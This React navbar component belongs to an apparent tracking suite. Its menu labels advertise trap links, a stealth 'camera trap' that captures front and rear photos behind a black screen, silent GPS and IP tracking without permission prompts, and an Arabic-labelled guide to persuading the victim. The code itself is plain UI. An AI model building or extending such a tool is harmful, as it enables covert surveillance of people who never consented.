import React, { useState } from 'react';
import {
  Globe,
  Radio,
  Shield,
  ListCollapse,
  Search,
  HelpCircle,
  Link2,
  Menu,
  X,
  Crosshair,
  Sparkles,
  Send,
  ExternalLink,
  ChevronRight,
  ShieldCheck,
  FileText,
  Compass,
} from 'lucide-react';
import { Language, translations } from '../translations';
import { Cpu, BookOpen, Camera } from 'lucide-react';
import { TrackingMode } from '../types';

export type MainNavView = 'home' | 'ip-lookup' | 'support' | 'track' | 'mac-lookup' | 'exif-tool' | 'cyber-awareness';

interface NavbarProps {
  lang: Language;
  onToggleLang: () => void;
  onGoHome: () => void;
  activeView: MainNavView;
  onChangeView: (view: MainNavView) => void;
  onOpenTrapModal?: (mode: TrackingMode) => void;
  savedCount: number;
  onOpenSaved: () => void;
}

export const Navbar: React.FC<NavbarProps> = ({
  lang,
  onToggleLang,
  onGoHome,
  activeView,
  onChangeView,
  onOpenTrapModal,
  savedCount,
  onOpenSaved,
}) => {
  const t = translations[lang];
  const [drawerOpen, setDrawerOpen] = useState(false);
  const logoUrl = 'https://i.ibb.co/d4SN4h4h/Screenshot-20260723-035727-Gallery.jpg';
  const telegramLogoImg = 'https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg';

  const navItems: {
    id: string;
    view?: MainNavView;
    trapMode?: TrackingMode;
    action?: () => void;
    label: string;
    desc: string;
    icon: React.ReactNode;
    badge?: string;
    badgeColor?: string;
  }[] = [
    {
      id: 'sec-home',
      trapMode: 'precise',
      label: lang === 'ar' ? '1. الرئيسية وتلغيم الروابط الذكية' : '1. Link Trap Generator',
      desc: lang === 'ar' ? 'تلغيم وإنشاء روابط التتبع الفوري والموجه الذكي' : 'Create smart tracking and auto-redirect links',
      icon: <Link2 className="w-4 h-4 text-indigo-600" />,
      badge: 'Core',
      badgeColor: 'bg-indigo-100 text-indigo-700',
    },
    {
      id: 'sec-camera',
      trapMode: 'camera',
      label: lang === 'ar' ? '2. نظام فخ الكاميرا (كحد أقصى 30 صورة)' : '2. Camera Trap Surveillance (Max 30 Photos)',
      desc: lang === 'ar' ? 'تلغيم رابط يلتقط صورة كل ثانية بالتناوب بين الأمامية والخلفية بشاشة سوداء' : 'Up to 30 sequential photos front/rear stealth capture every 1s',
      icon: <Camera className="w-4 h-4 text-rose-600" />,
      badge: 'CAMERA',
      badgeColor: 'bg-rose-100 text-rose-700',
    },
    {
      id: 'sec-gps',
      trapMode: 'precise',
      label: lang === 'ar' ? '3. تحديد إحداثيات (GPS والمستشعرات)' : '3. High-Accuracy GPS Tracker',
      desc: lang === 'ar' ? 'تلغيم رابط يرصد إحداثيات قمر صناعي بالأمتار وبطارية ومعالج GPU' : 'Satellite GPS coordinates, battery & GPU fingerprint',
      icon: <Crosshair className="w-4 h-4 text-indigo-600" />,
      badge: 'GPS',
      badgeColor: 'bg-indigo-100 text-indigo-700',
    },
    {
      id: 'sec-silent-ip',
      trapMode: 'near',
      label: lang === 'ar' ? '4. التتبع الصامت للشبكة وIP' : '4. Silent Near IP Intelligence',
      desc: lang === 'ar' ? 'تلغيم رابط يرصد IP والدولة والمزود ونوع الخط بدون أي نوافذ إذن' : 'Silent IP, country, ISP, and network medium with zero prompts',
      icon: <Radio className="w-4 h-4 text-emerald-600" />,
      badge: 'Silent',
      badgeColor: 'bg-emerald-100 text-emerald-700',
    },
    {
      id: 'sec-pdf-canary',
      trapMode: 'pdf',
      label: lang === 'ar' ? '5. تتبع وثائق ومستندات الـ PDF' : '5. Canary PDF Document Tracker',
      desc: lang === 'ar' ? 'تلغيم مستند PDF استخباري يرصد فتح المستند وموقع الفاتح فوراً' : 'Embedded canary tokens logging remote PDF openings',
      icon: <FileText className="w-4 h-4 text-amber-600" />,
      badge: 'PDF',
      badgeColor: 'bg-amber-100 text-amber-700',
    },
    {
      id: 'sec-ip-lookup',
      view: 'ip-lookup',
      label: lang === 'ar' ? '6. استعلام وفحص الـ IP وكشف VPN' : '6. IP Intelligence & Threat Audit',
      desc: lang === 'ar' ? 'فحص شبكات IP وكشف VPN و ISP ومراكز البيانات والخرائط' : 'Scan IP, detect VPN/proxy, resolve ISP & GPS',
      icon: <Globe className="w-4 h-4 text-cyan-600" />,
      badge: 'PRO',
      badgeColor: 'bg-cyan-100 text-cyan-700',
    },
    {
      id: 'sec-mac-lookup',
      view: 'mac-lookup',
      label: lang === 'ar' ? '7. فحص الماك أدرس وهوية الأجهزة' : '7. Hardware MAC Address Lookup',
      desc: lang === 'ar' ? 'معرفة الشركة المصنعة ونوع الجهاز عبر قاعدة بيانات IEEE OUI' : 'Identify hardware vendor & device type via IEEE OUI',
      icon: <Cpu className="w-4 h-4 text-indigo-600" />,
      badge: 'OUI',
      badgeColor: 'bg-indigo-100 text-indigo-700',
    },
    {
      id: 'sec-exif-tool',
      view: 'exif-tool',
      label: lang === 'ar' ? '8. فاحص بيانات الصور (ExifTool)' : '8. ExifTool Metadata Extractor',
      desc: lang === 'ar' ? 'استخراج بيانات EXIF وإحداثيات GPS المدمجة ومواصفات الكاميرا' : 'Extract EXIF metadata, embedded GPS & camera optics',
      icon: <Camera className="w-4 h-4 text-emerald-600" />,
      badge: 'EXIF',
      badgeColor: 'bg-emerald-100 text-emerald-700',
    },
    {
      id: 'sec-cyber-awareness',
      view: 'cyber-awareness',
      label: lang === 'ar' ? '9. مركز التوعية بالهندسة الاجتماعية (80 تكتيكاً)' : '9. Social Engineering Center (80 Types)',
      desc: lang === 'ar' ? 'موسوعة الحماية وحيل استدراج الكاميرا وكابتشا الوجه والروابط' : 'Comprehensive 80 social engineering threats & defenses',
      icon: <BookOpen className="w-4 h-4 text-rose-600" />,
      badge: '80 EDU',
      badgeColor: 'bg-rose-100 text-rose-700',
    },
    {
      id: 'sec-guide',
      action: () => {
        onChangeView('home');
        setTimeout(() => {
          const guide = document.getElementById('sec-guide');
          if (guide) guide.scrollIntoView({ behavior: 'smooth', block: 'start' });
        }, 100);
      },
      label: lang === 'ar' ? '10. دليل الشرح وطرق إقناع الضحية' : '10. Sections & Persuasion Guide',
      desc: lang === 'ar' ? 'شرح تفصيلي للأقسام الـ 8 وسيناريوهات استدراج الكاميرا والـ GPS' : 'Full manual and psychological pretexting scenarios',
      icon: <Compass className="w-4 h-4 text-indigo-600" />,
      badge: 'GUIDE',
      badgeColor: 'bg-indigo-100 text-indigo-700',
    },
    {
      id: 'sec-support',
      view: 'support',
      label: lang === 'ar' ? '11. الدعم الفني والمطور (AlQeyadah)' : '11. Lead Developer & Support',
      desc: lang === 'ar' ? 'تواصل مع المهندس محمد أبو السعود @SM_MS_IP' : 'Contact Lead Developer Mohamed Abu AlSaud',
      icon: <HelpCircle className="w-4 h-4 text-indigo-600" />,
      badge: 'Support',
      badgeColor: 'bg-slate-100 text-slate-700',
    },
  ];

  return (
    <>
      <header className="sticky top-0 z-40 w-full bg-white border-b border-slate-200 shadow-sm transition-colors">
        <div className="max-w-6xl mx-auto px-3 sm:px-6 h-13 sm:h-14 flex items-center justify-between gap-2">
          {/* Left: 3-Bars Hamburger Button + Brand */}
          <div className="flex items-center gap-1.5 sm:gap-2">
            {/* 3-Bars Menu Button */}
            <button
              id="btn-main-menu-drawer"
              onClick={() => setDrawerOpen(true)}
              className="p-1.5 rounded-lg bg-slate-100 hover:bg-slate-200 text-slate-800 border border-slate-200 transition-all active:scale-95 cursor-pointer flex items-center justify-center"
              title={lang === 'ar' ? 'القائمة والأقسام' : 'Menu & Sections'}
            >
              <Menu className="w-4 h-4 text-indigo-700" />
            </button>

            {/* Logo and Brand */}
            <div
              id="brand-header"
              onClick={onGoHome}
              className="flex items-center gap-1.5 cursor-pointer group select-none transition-transform active:scale-98 shrink-0"
            >
              <div className="relative w-7.5 h-7.5 rounded-full overflow-hidden p-0.5 border-2 border-indigo-600 bg-white shadow-2xs group-hover:border-indigo-700 group-hover:shadow-xs transition-all">
                <img
                  src={logoUrl}
                  alt={t.logoAlt}
                  className="w-full h-full object-cover rounded-full"
                  referrerPolicy="no-referrer"
                  onError={(e) => {
                    (e.target as HTMLImageElement).style.display = 'none';
                  }}
                />
              </div>

              <div className="flex items-center gap-1">
                <span className="text-sm sm:text-base font-black tracking-tight text-indigo-950 font-sans">
                  {t.appName}
                </span>
              </div>
            </div>
          </div>

          {/* Center: Navigation Pills (Desktop) */}
          <nav className="hidden md:flex items-center bg-slate-100 p-1 rounded-xl border border-slate-200 gap-1">
            <button
              onClick={() => onChangeView('home')}
              className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-bold transition-all cursor-pointer ${
                activeView === 'home'
                  ? 'bg-white text-indigo-700 shadow-xs'
                  : 'text-slate-600 hover:text-slate-950'
              }`}
            >
              <Link2 className="w-3.5 h-3.5" />
              <span>{t.navHome}</span>
            </button>

            <button
              onClick={() => onChangeView('ip-lookup')}
              className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-bold transition-all cursor-pointer ${
                activeView === 'ip-lookup'
                  ? 'bg-white text-indigo-700 shadow-xs'
                  : 'text-slate-600 hover:text-slate-950'
              }`}
            >
              <Globe className="w-3.5 h-3.5" />
              <span>{t.navIpLookup}</span>
            </button>

            <button
              onClick={() => onChangeView('support')}
              className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-bold transition-all cursor-pointer ${
                activeView === 'support'
                  ? 'bg-white text-indigo-700 shadow-xs'
                  : 'text-slate-600 hover:text-slate-950'
              }`}
            >
              <HelpCircle className="w-3.5 h-3.5" />
              <span>{t.navSupport}</span>
            </button>
          </nav>

          {/* Right side controls: Saved Links + Lang */}
          <div className="flex items-center gap-1.5 sm:gap-2">
            {/* Saved Links Button */}
            {savedCount > 0 && (
              <button
                id="btn-saved-links"
                onClick={onOpenSaved}
                className="relative inline-flex items-center gap-1.5 px-2.5 sm:px-3 py-1.5 rounded-xl text-xs font-semibold text-slate-800 bg-slate-100 hover:bg-slate-200 border border-slate-200 transition-colors cursor-pointer"
                title={t.navRecent}
              >
                <ListCollapse className="w-3.5 h-3.5 text-indigo-600" />
                <span className="hidden sm:inline">{t.navRecent}</span>
                <span className="inline-flex items-center justify-center px-1.5 py-0.2 rounded-full text-[10px] font-extrabold bg-indigo-600 text-white min-w-4">
                  {savedCount}
                </span>
              </button>
            )}

            {/* Language Switcher */}
            <div className="flex items-center bg-slate-100 p-0.5 rounded-xl border border-slate-200">
              <button
                id="btn-lang-ar"
                onClick={() => {
                  if (lang !== 'ar') onToggleLang();
                }}
                className={`px-2 sm:px-2.5 py-1 text-xs font-bold rounded-lg transition-all cursor-pointer ${
                  lang === 'ar'
                    ? 'bg-white text-indigo-700 shadow-xs'
                    : 'text-slate-500 hover:text-slate-800'
                }`}
              >
                عربي
              </button>
              <button
                id="btn-lang-en"
                onClick={() => {
                  if (lang !== 'en') onToggleLang();
                }}
                className={`px-2 sm:px-2.5 py-1 text-xs font-bold rounded-lg transition-all cursor-pointer ${
                  lang === 'en'
                    ? 'bg-white text-indigo-700 shadow-xs'
                    : 'text-slate-500 hover:text-slate-800'
                }`}
              >
                EN
              </button>
            </div>
          </div>
        </div>
      </header>

      {/* 3-Bars Navigation Glass Drawer Overlay */}
      {drawerOpen && (
        <div className="fixed inset-0 z-50 flex animate-in fade-in duration-200">
          {/* Backdrop */}
          <div
            onClick={() => setDrawerOpen(false)}
            className="fixed inset-0 bg-slate-950/60 backdrop-blur-xs"
          />

          {/* Sliding Glass Panel */}
          <div
            className={`relative w-full max-w-sm bg-white/95 backdrop-blur-md h-full shadow-2xl border-e border-slate-200 p-4 sm:p-5 flex flex-col justify-between overflow-y-auto z-10 transition-transform ${
              lang === 'ar' ? 'ms-0' : 'me-0'
            }`}
          >
            <div className="flex flex-col gap-4">
              {/* Drawer Top Header */}
              <div className="flex items-center justify-between pb-3 border-b border-slate-100">
                <div className="flex items-center gap-2">
                  <div className="w-8 h-8 rounded-full overflow-hidden p-0.5 border border-indigo-600 bg-white">
                    <img
                      src={logoUrl}
                      alt="Logo"
                      referrerPolicy="no-referrer"
                      className="w-full h-full object-cover rounded-full"
                    />
                  </div>
                  <div className="flex flex-col">
                    <span className="font-mono font-black text-sm text-slate-950 leading-tight">
                      {t.appName}
                    </span>
                    <span className="text-[10px] text-slate-500 font-semibold">
                      SM v2.0
                    </span>
                  </div>
                </div>

                <button
                  onClick={() => setDrawerOpen(false)}
                  className="p-1.5 rounded-lg text-slate-400 hover:text-slate-950 hover:bg-slate-100 cursor-pointer transition-colors"
                >
                  <X className="w-5 h-5" />
                </button>
              </div>

              {/* Sections List */}
              <div className="flex flex-col gap-1.5">
                <span className="text-[10px] font-bold text-slate-400 uppercase tracking-wider px-1">
                  {lang === 'ar' ? 'أقسام وأنظمة المنظومة (8 أقسام)' : 'System Modules (8 Core Systems)'}
                </span>

                {navItems.map((item) => {
                  const isActive = item.view ? activeView === item.view : false;
                  return (
                    <button
                      key={item.id}
                      onClick={() => {
                        if (item.trapMode && onOpenTrapModal) {
                          onOpenTrapModal(item.trapMode);
                        } else if (item.action) {
                          item.action();
                        } else if (item.view) {
                          onChangeView(item.view);
                        }
                        setDrawerOpen(false);
                      }}
                      className={`flex items-start gap-3 p-2.5 sm:p-3 rounded-2xl border text-start transition-all cursor-pointer ${
                        isActive
                          ? 'bg-indigo-50/80 border-indigo-200 text-indigo-950 shadow-2xs'
                          : 'bg-white/80 border-slate-200 hover:bg-slate-50 hover:border-indigo-300 text-slate-800'
                      }`}
                    >
                      <div className="p-2 rounded-xl bg-white border border-slate-200 shadow-2xs shrink-0 mt-0.5">
                        {item.icon}
                      </div>

                      <div className="flex flex-col flex-1 min-w-0">
                        <div className="flex items-center justify-between gap-1">
                          <span className="font-black text-xs text-slate-950 truncate">
                            {item.label}
                          </span>
                          {item.badge && (
                            <span className={`px-1.5 py-0.2 rounded-md text-[9px] font-black shrink-0 ${item.badgeColor || 'bg-indigo-100 text-indigo-700'}`}>
                              {item.badge}
                            </span>
                          )}
                        </div>
                        <span className="text-[11px] text-slate-500 line-clamp-1 mt-0.5">
                          {item.desc}
                        </span>
                      </div>

                      <ChevronRight className="w-4 h-4 text-slate-400 rtl:rotate-180 self-center shrink-0" />
                    </button>
                  );
                })}

                {/* Saved Links Section Button */}
                {savedCount > 0 && (
                  <button
                    onClick={() => {
                      onOpenSaved();
                      setDrawerOpen(false);
                    }}
                    className="flex items-center justify-between p-3 rounded-2xl bg-white/80 border border-slate-200 hover:border-indigo-300 text-slate-800 transition-all cursor-pointer"
                  >
                    <div className="flex items-center gap-3">
                      <div className="p-2 rounded-xl bg-white border border-slate-200 shadow-2xs">
                        <ListCollapse className="w-4 h-4 text-indigo-600" />
                      </div>
                      <div className="flex flex-col text-start">
                        <span className="font-black text-xs text-slate-950">
                          {t.recentLinksTitle}
                        </span>
                        <span className="text-[11px] text-slate-500">
                          {savedCount} {lang === 'ar' ? 'روابط نشطة محفوظة' : 'Saved active links'}
                        </span>
                      </div>
                    </div>
                    <span className="inline-flex items-center justify-center px-2 py-0.5 rounded-full text-xs font-black bg-indigo-600 text-white">
                      {savedCount}
                    </span>
                  </button>
                )}
              </div>

              {/* Developer & Direct Support Quick Tile */}
              <div className="p-3 rounded-2xl bg-slate-50 border border-slate-200 flex flex-col gap-2">
                <div className="flex items-center gap-2">
                  <div className="w-8 h-8 rounded-full overflow-hidden border border-slate-300 bg-white shrink-0">
                    <img
                      src={logoUrl}
                      alt="Developer"
                      referrerPolicy="no-referrer"
                      className="w-full h-full object-cover rounded-full"
                    />
                  </div>
                  <div className="flex flex-col min-w-0">
                    <span className="font-bold text-xs text-slate-950 leading-tight truncate">
                      AlQeyadah AlZaeem
                    </span>
                    <span className="text-[10px] text-indigo-700 font-mono font-bold">
                      @SM_MS_IP
                    </span>
                  </div>
                </div>

                <a
                  href="https://t.me/SM_MS_IP"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="inline-flex items-center justify-center gap-1.5 px-3 py-1.5 rounded-xl bg-[#229ED9] hover:bg-[#1e8ec3] text-white font-bold text-xs shadow-xs transition-all active:scale-98"
                >
                  <img
                    src={telegramLogoImg}
                    alt="Telegram"
                    referrerPolicy="no-referrer"
                    className="w-3.5 h-3.5 object-contain brightness-0 invert"
                  />
                  <span>{lang === 'ar' ? 'تواصل عبر تيليجرام' : 'Telegram Support'}</span>
                  <ExternalLink className="w-3 h-3" />
                </a>
              </div>
            </div>

            {/* Drawer Bottom Info */}
            <div className="pt-3 border-t border-slate-100 flex flex-col gap-2">
              <div className="flex items-center justify-between text-[11px] text-slate-500">
                <span>SM Intelligence Suite</span>
                <span className="font-mono font-bold text-indigo-700 bg-indigo-50 px-2 py-0.5 rounded-md border border-indigo-200">v2.0</span>
              </div>
            </div>
          </div>
        </div>
      )}
    </>
  );
};

